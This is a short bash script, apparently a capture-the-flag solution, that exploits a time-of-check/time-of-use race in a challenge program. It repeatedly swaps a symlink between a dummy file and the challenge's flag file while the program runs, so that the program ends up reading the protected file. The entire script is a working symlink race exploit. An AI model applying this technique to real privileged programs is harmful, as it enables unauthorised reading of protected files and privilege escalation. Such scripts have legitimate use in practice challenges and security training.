#!/bin/bash

LINK="fileSus.txt"
TARGET="../../challenge/flag"
DUMMY="dummy.txt"

while true; do
    ln -sf "$DUMMY" "$LINK"
    ./../../challenge/challenge <<< $LINK &
    ln -sf "$TARGET" "$LINK"
    sleep 0.5
done